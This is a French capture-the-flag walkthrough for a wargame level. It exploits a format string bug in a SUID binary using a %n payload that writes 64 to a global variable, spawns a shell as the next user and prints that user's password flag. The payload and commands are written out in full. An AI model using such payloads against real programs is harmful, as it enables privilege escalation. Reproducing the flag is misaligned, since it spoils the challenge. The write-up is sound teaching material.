# Level3 - Walkthrough

## Objectif
Exploiter une format string vulnerability pour écrire la valeur `64` dans la variable globale `m` et déclencher `system("/bin/sh")`.

---

## Étapes d'exploitation

### 1. Reconnaissance
```bash
ls -la
# -rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
# ⚠️ Bit SUID actif → s'exécute avec les droits de level4

python -c "print('%x %x %x')" | ./level3
# 200 b7fd1ac0 b7ff37d0
# → Des valeurs hex s'affichent → Format string vulnerability confirmée
```

### 2. Analyse du code (Ghidra)

```c
int m;  // Variable globale

void v(void) {
    char local_20c[520];
    fgets(local_20c, 0x200, stdin);
    printf(local_20c);  // ⚠️ Vulnérable !
    if (m == 0x40) {    // Si m == 64
        system("/bin/sh");
    }
}
```

**Objectif** : Écrire `64` dans `m` via la format string vulnerability.

### 3. Trouver l'adresse de `m`

Dans Ghidra → cliquer sur la variable `m` dans `v()`.

**Adresse de `m` : `0x0804988c`**

### 4. Trouver la position du buffer sur la stack

```bash
python -c "print('AAAA' + '%x.'*10)" | ./level3
# AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825...
#                            ^^^^^^^^
#                            "AAAA" = 0x41414141 → Position 4
```

**Notre buffer commence en position 4 sur la stack.**

### 5. Construction du payload

**Calcul** :
```
Valeur cible     = 64 (0x40)
Adresse affichée = 4 octets
Padding          = 64 - 4 = 60 → %60x
```

**Conversion de l'adresse en little-endian** :
```
0x0804988c → \x8c\x98\x04\x08
```

**Structure du payload** :
```
[Adresse de m (4 octets)] + [%60x] + [%4$n]
        ↓                      ↓         ↓
  \x8c\x98\x04\x08     60 chars    Écrit 64 à l'adresse en position 4
```

**Total affiché avant `%4$n`** : 4 + 60 = **64** → `m = 64` ✅

### 6. Exploitation

```bash
(python -c "print('\x8c\x98\x04\x08' + '%60x' + '%4\$n')"; cat) | ./level3
```

**Résultat** :
```
Wait what?!
$
```

### 7. Vérification
```bash
$ whoami
level4
```

### 8. Récupération du flag

```bash
$ cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

---

## Flag
```
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## Type de vulnérabilité
- Format String Vulnerability (CWE-134)
- SUID privilege escalation (CWE-250)